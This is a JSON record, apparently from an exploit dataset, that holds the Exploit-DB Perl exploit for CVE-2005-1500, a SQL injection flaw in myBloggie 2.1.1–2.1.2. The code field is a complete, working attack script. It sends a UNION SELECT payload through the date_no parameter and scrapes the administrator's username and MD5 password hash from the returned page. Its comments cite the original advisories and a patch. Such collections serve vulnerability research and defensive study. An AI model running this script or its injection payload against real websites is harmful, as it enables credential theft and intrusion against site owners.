{
  "id": "1023",
  "title": "MyBloggie 2.1.1 &lt; 2.1.2 - SQL Injection",
  "cve": "CVE-2005-1500",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n#\r\n# SQL Injection Exploit for myBloggie 2.1.1 - 2.1.2\r\n# This exploit show the username of the administrator of the blog and his password crypted in MD5\r\n# Related advisories: (Italian) http://www.codebug.org/index.php?subaction=showfull&id=1115310052&archive=&start_from=&ucat=6&\r\n#                     (English) http://www.packetstormsecurity.org/0505-advisories/codebug-9.txt\r\n# Patch: http://mywebland.com/forums/viewtopic.php?t=180\r\n# Coded by Alberto Trivero and Discovered with CorryL\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"\\n\\t=======================================\\n\";\r\nprint \"\\t= Exploit for myBloggie 2.1.1 - 2.1.2 =\\n\";\r\nprint \"\\t=    Alberto Trivero - codebug.org    =\\n\";\r\nprint \"\\t=======================================\\n\\n\";\r\n\r\nif(!$ARGV[0] or !($ARGV[0]=~/http/) or !$ARGV[1] or ($ARGV[1] ne '2.1.1' and $ARGV[1] ne '2.1.2')) {\r\n   print \"Usage:\\nperl $0 [full_target_path] [version: 2.1.1 OR 2.1.2]\\n\\nExample:\\nperl $0 http://www.example.com/mybloggie/ 2.1.1\\n\";\r\n   exit(0);\r\n}\r\n\r\n$url=q[index.php?month_no=1&year=1&mode=viewdate&date_no=1%20UNION%20SELECT%20null,null,null,null,user,password,null,null,null,null%20FROM%20blog_user/*];\r\n$page=get($ARGV[0].$url) || die \"[-] Unable to retrieve: $!\";\r\nprint \"[+] Connected to: $ARGV[0]\\n\";\r\nif($ARGV[1] eq '2.1.1') {\r\n   $page=~m/<tr><td colspan=\"3\" class=\"subject\">(.*?)<\\/td><\\/tr>/ && print \"[+] Username of administrator is: $1\\n\";\r\n   print \"[-] Unable to retrieve username\\n\" if(!$1);\r\n}\r\nelse {\r\n   $page=~m/<img src=\"templates\\/aura\\/images\\/permalink.gif\" border=\"0\" title=\"Permalink\"><\\/a> (.*?)<\\/td><\\/tr>/ && print \"[+] Username of administrator is: $1\\n\";\r\n   print \"[-] Unable to retrieve username\\n\" if(!$1);\r\n}\r\n$page=~m/<tr><td colspan=\"3\" class=\"message\">(.*?)<\\/td><\\/tr>/ && print \"[+] MD5 hash of password is: $1\\n\";\r\nprint \"[-] Unable to retrieve hash of password\\n\" if(!$1);\r\n\r\n\r\n# milw0rm.com [2005-05-31]",
  "url": "https://www.exploit-db.com/exploits/1023"
}